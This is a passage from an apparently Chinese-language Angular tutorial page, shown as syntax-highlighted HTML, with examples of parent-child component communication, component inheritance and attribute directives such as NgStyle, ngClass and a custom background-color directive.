@<span class="token function">Component</span><span class="token punctuation">(</span><span class="token punctuation">{</span>
  selector<span class="token operator">:</span> <span class="token string">'child-component'</span><span class="token punctuation">,</span>
  template<span class="token operator">:</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">I'm {{ name }}</span><span class="token template-punctuation string">`</span></span>
<span class="token punctuation">}</span><span class="token punctuation">)</span>
<span class="token keyword">export</span> <span class="token keyword">class</span> <span class="token class-name">ChildComponent</span> <span class="token punctuation">{</span>
  <span class="token keyword">public</span> name<span class="token operator">:</span> string<span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token comment">// parent.component.ts</span>
<span class="token keyword">import</span> <span class="token punctuation">{</span>Component<span class="token punctuation">,</span> OnInit<span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">'@angular/core'</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token punctuation">{</span>ChildComponent<span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">'./child-component.ts'</span><span class="token punctuation">;</span>
@<span class="token function">Component</span><span class="token punctuation">(</span><span class="token punctuation">{</span>
  selector<span class="token operator">:</span> <span class="token string">'parent-component'</span><span class="token punctuation">,</span>
  template<span class="token operator">:</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">
    &lt;child-component #child&gt;&lt;/child-component&gt;
    &lt;button (click)=&quot;child.name = childName&quot;&gt;设置子组件名称&lt;/button&gt;
  </span><span class="token template-punctuation string">`</span></span>
<span class="token punctuation">}</span><span class="token punctuation">)</span>
<span class="token keyword">export</span> <span class="token keyword">class</span> <span class="token class-name">ParentComponent</span> <span class="token keyword">implements</span> <span class="token class-name">OnInit</span> <span class="token punctuation">{</span>
  <span class="token keyword">private</span> childName<span class="token operator">:</span> string<span class="token punctuation">;</span>
  <span class="token function">constructor</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token punctuation">}</span>
  <span class="token function">ngOnInit</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> 
    <span class="token keyword">this</span><span class="token punctuation">.</span>childName <span class="token operator">=</span> <span class="token string">'child-component'</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br><span class="line-number">24</span><br><span class="line-number">25</span><br><span class="line-number">26</span><br></div></div><h3 id="viewchild"><a href="#viewchild" class="header-anchor">#</a> @ViewChild</h3> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token comment">// child.component.ts</span>
<span class="token keyword">import</span> <span class="token punctuation">{</span> Component<span class="token punctuation">,</span> OnInit <span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">'@angular/core'</span><span class="token punctuation">;</span>
@<span class="token function">Component</span><span class="token punctuation">(</span><span class="token punctuation">{</span>
    selector<span class="token operator">:</span> <span class="token string">'exe-child'</span><span class="token punctuation">,</span>
    template<span class="token operator">:</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">
      &lt;p&gt;Child Component&lt;/p&gt;  
    </span><span class="token template-punctuation string">`</span></span>
<span class="token punctuation">}</span><span class="token punctuation">)</span>
<span class="token keyword">export</span> <span class="token keyword">class</span> <span class="token class-name">ChildComponent</span> <span class="token punctuation">{</span>
    name<span class="token operator">:</span> string <span class="token operator">=</span> <span class="token string">''</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token comment">// app.component.ts</span>
<span class="token keyword">import</span> <span class="token punctuation">{</span> Component<span class="token punctuation">,</span> ViewChild<span class="token punctuation">,</span> AfterViewInit <span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">'@angular/core'</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token punctuation">{</span> ChildComponent <span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">'./child.component'</span><span class="token punctuation">;</span>
@<span class="token function">Component</span><span class="token punctuation">(</span><span class="token punctuation">{</span>
  selector<span class="token operator">:</span> <span class="token string">'my-app'</span><span class="token punctuation">,</span>
  template<span class="token operator">:</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">
    &lt;h4&gt;Welcome to Angular World&lt;/h4&gt;
    &lt;exe-child&gt;&lt;/exe-child&gt;
  </span><span class="token template-punctuation string">`</span></span><span class="token punctuation">,</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span>
<span class="token keyword">export</span> <span class="token keyword">class</span> <span class="token class-name">AppComponent</span> <span class="token punctuation">{</span>
  @<span class="token function">ViewChild</span><span class="token punctuation">(</span>ChildComponent<span class="token punctuation">)</span>
  childCmp<span class="token operator">:</span> ChildComponent<span class="token punctuation">;</span>
  <span class="token function">ngAfterViewInit</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">this</span><span class="token punctuation">.</span>childCmp<span class="token punctuation">.</span>name <span class="token operator">=</span> <span class="token string">'child-component'</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br><span class="line-number">24</span><br><span class="line-number">25</span><br><span class="line-number">26</span><br><span class="line-number">27</span><br><span class="line-number">28</span><br></div></div><h3 id="messageservice"><a href="#messageservice" class="header-anchor">#</a> MessageService</h3> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token keyword">import</span> <span class="token punctuation">{</span> Injectable <span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">'@angular/core'</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token punctuation">{</span>BehaviorSubject<span class="token punctuation">,</span> Observable<span class="token punctuation">,</span> Subject<span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">'rxjs'</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token punctuation">{</span>ServicesModule<span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">'@app/service/service.module'</span><span class="token punctuation">;</span>
@<span class="token function">Injectable</span><span class="token punctuation">(</span><span class="token punctuation">{</span>
  providedIn<span class="token operator">:</span> ServicesModule
<span class="token punctuation">}</span><span class="token punctuation">)</span>
<span class="token keyword">export</span> <span class="token keyword">class</span> <span class="token class-name">MessageService</span> <span class="token punctuation">{</span>
  <span class="token keyword">private</span> subject <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">BehaviorSubject</span><span class="token operator">&lt;</span>any<span class="token operator">&gt;</span><span class="token punctuation">(</span><span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">sendMessage</span><span class="token punctuation">(</span><span class="token parameter">obj</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">this</span><span class="token punctuation">.</span>subject<span class="token punctuation">.</span><span class="token function">next</span><span class="token punctuation">(</span>obj<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
  <span class="token function">clearMessage</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">return</span> <span class="token keyword">this</span><span class="token punctuation">.</span>subject<span class="token punctuation">.</span><span class="token function">unsubscribe</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
  <span class="token function">getMessage</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">:</span> Observable<span class="token operator">&lt;</span>any<span class="token operator">&gt;</span> <span class="token punctuation">{</span>
    <span class="token keyword">return</span> <span class="token keyword">this</span><span class="token punctuation">.</span>subject<span class="token punctuation">.</span><span class="token function">asObservable</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br></div></div><h2 id="组件继承"><a href="#组件继承" class="header-anchor">#</a> 组件继承</h2> <p>组件继承涉及以下的内容：</p> <ul><li><p>Metadata：如 @Input()、@Output()、@ContentChild/Children、@ViewChild/Children 等。在派生类中定义的元数据将覆盖继承链中的任何先前的元数据，否则将使用基类元数据。</p></li> <li><p>Constructor：如果派生类未声明构造函数，它将使用基类的构造函数。这意味着在基类构造函数注入的所有服务，子组件都能访问到。</p></li> <li><p>Lifecycle hooks：如果基类中包含生命周期钩子，如 ngOnInit、ngOnChanges 等。尽管在派生类没有定义相应的生命周期钩子，基类的生命周期钩子会被自动调用。</p></li></ul> <p>需要注意的是，模板是不能被继承的 ，因此共享的 DOM 结构或行为需要单独处理。</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token comment">// exe-base.component.ts</span>
<span class="token keyword">import</span> <span class="token punctuation">{</span> Component<span class="token punctuation">,</span> ElementRef<span class="token punctuation">,</span> Input<span class="token punctuation">,</span> HostBinding<span class="token punctuation">,</span> HostListener<span class="token punctuation">,</span> OnInit <span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">'@angular/core'</span><span class="token punctuation">;</span>
@<span class="token function">Component</span><span class="token punctuation">(</span><span class="token punctuation">{</span>
    selector<span class="token operator">:</span> <span class="token string">'exe-base'</span><span class="token punctuation">,</span>
    <span class="token comment">// template will not be inherited </span>
    template<span class="token operator">:</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">
    &lt;div&gt;
       exe-base：我是base组件么? - {{isBase}}
    &lt;/div&gt;
  </span><span class="token template-punctuation string">`</span></span>
<span class="token punctuation">}</span><span class="token punctuation">)</span>
<span class="token keyword">export</span> <span class="token keyword">class</span> <span class="token class-name">BaseComponent</span> <span class="token keyword">implements</span> <span class="token class-name">OnInit</span> <span class="token punctuation">{</span>
    @<span class="token function">Input</span><span class="token punctuation">(</span><span class="token punctuation">)</span> isBase<span class="token operator">:</span> boolean <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>
    @<span class="token function">HostBinding</span><span class="token punctuation">(</span><span class="token string">'style.color'</span><span class="token punctuation">)</span> color <span class="token operator">=</span> <span class="token string">'blue'</span><span class="token punctuation">;</span> <span class="token comment">// will be inherited </span>
    @<span class="token function">HostListener</span><span class="token punctuation">(</span><span class="token string">'click'</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token string">'$event'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token comment">// will be inherited </span>
    <span class="token function">onClick</span><span class="token punctuation">(</span><span class="token parameter">event<span class="token operator">:</span> Event</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">I am BaseComponent</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token function">constructor</span><span class="token punctuation">(</span><span class="token parameter"><span class="token keyword">protected</span> eleRef<span class="token operator">:</span> ElementRef</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token punctuation">}</span>
    <span class="token function">ngOnInit</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        console<span class="token punctuation">.</span><span class="token function">dir</span><span class="token punctuation">(</span><span class="token string">'BaseComponent：ngOnInit method has been called'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
<span class="token comment">// exe-inherited.component.ts</span>
<span class="token keyword">import</span> <span class="token punctuation">{</span> Component<span class="token punctuation">,</span> HostListener<span class="token punctuation">,</span> OnChanges<span class="token punctuation">,</span> SimpleChanges <span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">'@angular/core'</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token punctuation">{</span> BaseComponent <span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">'./exe-base.component'</span><span class="token punctuation">;</span>
@<span class="token function">Component</span><span class="token punctuation">(</span><span class="token punctuation">{</span>
    selector<span class="token operator">:</span> <span class="token string">'exe-inherited'</span><span class="token punctuation">,</span>
    template<span class="token operator">:</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">
    &lt;div&gt;
      exe-inherited：我是base组件么? - {{isBase}}
    &lt;/div&gt;
  </span><span class="token template-punctuation string">`</span></span>
<span class="token punctuation">}</span><span class="token punctuation">)</span>
<span class="token keyword">export</span> <span class="token keyword">class</span> <span class="token class-name">InheritedComponent</span> <span class="token keyword">extends</span> <span class="token class-name">BaseComponent</span>
    <span class="token keyword">implements</span> <span class="token class-name">OnChanges</span> <span class="token punctuation">{</span>
    @<span class="token function">HostListener</span><span class="token punctuation">(</span><span class="token string">'click'</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token string">'$event'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token comment">// overridden</span>
    <span class="token function">onClick</span><span class="token punctuation">(</span><span class="token parameter">event<span class="token operator">:</span> Event</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">I am InheritedComponent</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token function">ngOnChanges</span><span class="token punctuation">(</span><span class="token parameter">changes<span class="token operator">:</span> SimpleChanges</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        console<span class="token punctuation">.</span><span class="token function">dir</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>eleRef<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// this.eleRef.nativeElement：exe-inherited</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
<span class="token comment">// app.component.ts</span>
<span class="token keyword">import</span> <span class="token punctuation">{</span> Component<span class="token punctuation">,</span> OnInit <span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">'@angular/core'</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token punctuation">{</span>ManagerService<span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">&quot;./manager.service&quot;</span><span class="token punctuation">;</span>
@<span class="token function">Component</span><span class="token punctuation">(</span><span class="token punctuation">{</span>
  selector<span class="token operator">:</span> <span class="token string">'exe-app'</span><span class="token punctuation">,</span>
  template<span class="token operator">:</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">
    &lt;exe-base&gt;&lt;/exe-base&gt;
    &lt;hr/&gt;
    &lt;exe-inherited [isBase]=&quot;false&quot;&gt;&lt;/exe-inherited&gt;
  </span><span class="token template-punctuation string">`</span></span>
<span class="token punctuation">}</span><span class="token punctuation">)</span>
<span class="token keyword">export</span> <span class="token keyword">class</span> <span class="token class-name">AppComponent</span> <span class="token punctuation">{</span>
  currentPage<span class="token operator">:</span> number <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>
  totalPage<span class="token operator">:</span> number <span class="token operator">=</span> <span class="token number">5</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br><span class="line-number">24</span><br><span class="line-number">25</span><br><span class="line-number">26</span><br><span class="line-number">27</span><br><span class="line-number">28</span><br><span class="line-number">29</span><br><span class="line-number">30</span><br><span class="line-number">31</span><br><span class="line-number">32</span><br><span class="line-number">33</span><br><span class="line-number">34</span><br><span class="line-number">35</span><br><span class="line-number">36</span><br><span class="line-number">37</span><br><span class="line-number">38</span><br><span class="line-number">39</span><br><span class="line-number">40</span><br><span class="line-number">41</span><br><span class="line-number">42</span><br><span class="line-number">43</span><br><span class="line-number">44</span><br><span class="line-number">45</span><br><span class="line-number">46</span><br><span class="line-number">47</span><br><span class="line-number">48</span><br><span class="line-number">49</span><br><span class="line-number">50</span><br><span class="line-number">51</span><br><span class="line-number">52</span><br><span class="line-number">53</span><br><span class="line-number">54</span><br><span class="line-number">55</span><br><span class="line-number">56</span><br><span class="line-number">57</span><br><span class="line-number">58</span><br><span class="line-number">59</span><br></div></div><p><img src="/vuebloger/img/post/3626192161-58e72e8a5d8cb_fix732.pngg" alt=""></p> <p>其中BaseComponent 中 ngOnInit() 钩子被调用了两次，@Component() 中元数据没有被继承。子组件是不能继承父组件装饰器中元数据。因为我们的元数据用是来描述组件类的，不同的组件我们是需要不同的元数据，如 selector、template 等。</p> <h2 id="指令"><a href="#指令" class="header-anchor">#</a> 指令</h2> <p>指令分为属性型指令和结构型指令。</p> <h3 id="属性型指令"><a href="#属性型指令" class="header-anchor">#</a> 属性型指令</h3> <p>NgStyle</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token operator">&lt;</span>div <span class="token punctuation">[</span>ngStyle<span class="token punctuation">]</span><span class="token operator">=</span><span class="token string">&quot;{'background-color': person.country === 'UK' ? 'green' : 'red'}&quot;</span><span class="token operator">&gt;</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p>源码片段</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code>@<span class="token function">Directive</span><span class="token punctuation">(</span><span class="token punctuation">{</span>selector<span class="token operator">:</span> <span class="token string">'[ngStyle]'</span><span class="token punctuation">}</span><span class="token punctuation">)</span>
<span class="token keyword">export</span> <span class="token keyword">class</span> <span class="token class-name">NgStyle</span> <span class="token keyword">implements</span> <span class="token class-name">DoCheck</span> <span class="token punctuation">{</span>
  <span class="token keyword">private</span> _ngStyle<span class="token operator">:</span> <span class="token punctuation">{</span><span class="token punctuation">[</span>key<span class="token operator">:</span> string<span class="token punctuation">]</span><span class="token operator">:</span> string<span class="token punctuation">}</span><span class="token punctuation">;</span>
  <span class="token keyword">private</span> _differ<span class="token operator">:</span> KeyValueDiffer<span class="token operator">&lt;</span>string<span class="token punctuation">,</span> string<span class="token operator">|</span>number<span class="token operator">&gt;</span><span class="token punctuation">;</span>
  <span class="token function">constructor</span><span class="token punctuation">(</span>
    <span class="token parameter"><span class="token keyword">private</span> _differs<span class="token operator">:</span> KeyValueDiffers<span class="token punctuation">,</span> 
    <span class="token keyword">private</span> _ngEl<span class="token operator">:</span> ElementRef<span class="token punctuation">,</span> 
    <span class="token keyword">private</span> _renderer<span class="token operator">:</span> Renderer</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token punctuation">}</span>

  @<span class="token function">Input</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
  <span class="token keyword">set</span> <span class="token function">ngStyle</span><span class="token punctuation">(</span><span class="token parameter">v<span class="token operator">:</span> <span class="token punctuation">{</span><span class="token punctuation">[</span>key<span class="token operator">:</span> string<span class="token punctuation">]</span><span class="token operator">:</span> string<span class="token punctuation">}</span></span><span class="token punctuation">)</span> <span class="token punctuation">{</span> 
    <span class="token comment">// &lt;div [ngStyle]=&quot;{color: 'white', 'background-color': 'blue'}&quot;&gt;</span>
    <span class="token keyword">this</span><span class="token punctuation">.</span>_ngStyle <span class="token operator">=</span> v<span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">this</span><span class="token punctuation">.</span>_differ <span class="token operator">&amp;&amp;</span> v<span class="token punctuation">)</span> <span class="token punctuation">{</span>
      <span class="token keyword">this</span><span class="token punctuation">.</span>_differ <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>_differs<span class="token punctuation">.</span><span class="token function">find</span><span class="token punctuation">(</span>v<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">create</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
  <span class="token punctuation">}</span>
 
  <span class="token comment">// 设置元素的样式</span>
  <span class="token keyword">private</span> <span class="token function">_setStyle</span><span class="token punctuation">(</span>nameAndUnit<span class="token operator">:</span> string<span class="token punctuation">,</span> value<span class="token operator">:</span> string<span class="token operator">|</span>number<span class="token punctuation">)</span><span class="token operator">:</span> <span class="token keyword">void</span> <span class="token punctuation">{</span>
    <span class="token keyword">const</span> <span class="token punctuation">[</span>name<span class="token punctuation">,</span> unit<span class="token punctuation">]</span> <span class="token operator">=</span> nameAndUnit<span class="token punctuation">.</span><span class="token function">split</span><span class="token punctuation">(</span><span class="token string">'.'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 截取样式名和单位</span>
    value <span class="token operator">=</span> value <span class="token operator">!=</span> <span class="token keyword">null</span> <span class="token operator">&amp;&amp;</span> unit <span class="token operator">?</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>value<span class="token interpolation-punctuation punctuation">}</span></span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>unit<span class="token interpolation-punctuation punctuation">}</span></span><span class="token template-punctuation string">`</span></span> <span class="token operator">:</span> value<span class="token punctuation">;</span>

    <span class="token keyword">this</span><span class="token punctuation">.</span>_renderer<span class="token punctuation">.</span><span class="token function">setElementStyle</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>_ngEl<span class="token punctuation">.</span>nativeElement<span class="token punctuation">,</span> name<span class="token punctuation">,</span> value <span class="token keyword">as</span> string<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br><span class="line-number">24</span><br><span class="line-number">25</span><br><span class="line-number">26</span><br></div></div><p>ngClass</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token operator">&lt;</span>div <span class="token punctuation">[</span>ngClass<span class="token punctuation">]</span><span class="token operator">=</span><span class="token string">&quot;{'text-success': person.country === 'CN'}&quot;</span><span class="token operator">&gt;</span><span class="token operator">&lt;</span><span class="token operator">/</span>div<span class="token operator">&gt;</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><h3 id="自定义属性指令"><a href="#自定义属性指令" class="header-anchor">#</a> 自定义属性指令</h3> <p>指令功能描述：该指令用于在用户点击宿主元素时，根据输入的背景颜色，更新宿主元素的背景颜色。宿主元素的默认颜色是黄色。</p> <ol><li>指令实现</li></ol> <div class="language-typescript line-numbers-mode"><pre class="language-typescript"><code><span class="token keyword">import</span> <span class="token punctuation">{</span>Directive<span class="token punctuation">,</span> Input<span class="token punctuation">,</span> ElementRef<span class="token punctuation">,</span> Renderer<span class="token punctuation">,</span> HostListener<span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">&quot;@angular/core&quot;</span><span class="token punctuation">;</span>

@<span class="token function">Directive</span><span class="token punctuation">(</span><span class="token punctuation">{</span>
  selector<span class="token operator">:</span> <span class="token string">'[exeBackground]'</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span>
<span class="token keyword">export</span> <span class="token keyword">class</span> <span class="token class-name">ExeBackgroundDirective</span> <span class="token punctuation">{</span>
  <span class="token keyword">private</span> _defaultColor <span class="token operator">=</span> <span class="token string">'yellow'</span><span class="token punctuation">;</span>

  @<span class="token function">Input</span><span class="token punctuation">(</span><span class="token string">'exeBackground'</span><span class="token punctuation">)</span>
  backgroundColor<span class="token operator">:</span> <span class="token builtin">string</span><span class="token punctuation">;</span> <span class="token comment">// 输入属性，用于设置元素的背景颜色</span>

  <span class="token keyword">constructor</span><span class="token punctuation">(</span><span class="token parameter"><span class="token keyword">private</span> elementRef<span class="token operator">:</span> ElementRef<span class="token punctuation">,</span> <span class="token keyword">private</span> renderer<span class="token operator">:</span> Renderer</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">setStyle</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>_defaultColor<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>

  @<span class="token function">HostListener</span><span class="token punctuation">(</span><span class="token string">'click'</span><span class="token punctuation">)</span>
  <span class="token function">onClick</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token comment">// 监听宿主元素的点击事件，设置元素背景色</span>
    <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">setStyle</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>backgroundColor <span class="token operator">||</span> <span class="token keyword">this</span><span class="token punctuation">.</span>_defaultColor<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>

  <span class="token keyword">private</span> <span class="token function">setStyle</span><span class="token punctuation">(</span><span class="token parameter">color<span class="token operator">:</span> <span class="token builtin">string</span></span><span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token comment">// 调用renderer对象提供的API设置元素的背景颜色</span>
    <span class="token keyword">this</span><span class="token punctuation">.</span>renderer<span class="token punctuation">.</span><span class="token function">setElementStyle</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>elementRef<span class="token punctuation">.</span>nativeElement<span class="token punctuation">,</span> 
      <span class="token string">'backgroundColor'</span><span class="token punctuation">,</span> color<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br><span class="line-number">24</span><br><span class="line-number">25</span><br></div></div><p>2.指令应用：</p> <div class="language-typescript line-numbers-mode"><pre class="language-typescript"><code><span class="token keyword">import</span> <span class="token punctuation">{</span> Component <span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">'@angular/core'</span><span class="token punctuation">;</span>
@<span class="token function">Component</span><span class="token punctuation">(</span><span class="token punctuation">{</span>
  selector<span class="token operator">:</span> <span class="token string">'my-app'</span><span class="token punctuation">,</span> 
  template<span class="token operator">:</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">&lt;h1 [exeBackground]=&quot;'red'&quot;&gt;Hello {{name}}&lt;/h1&gt;</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">,</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span>
<span class="token keyword">export</span> <span class="token keyword">class</span> <span class="token class-name">AppComponent</span>  <span class="token punctuation">{</span>
  name <span class="token operator">=</span> <span class="token string">'Angular'</span><span class="token punctuation">;</span> 
<span class="token punctuation">}</span>
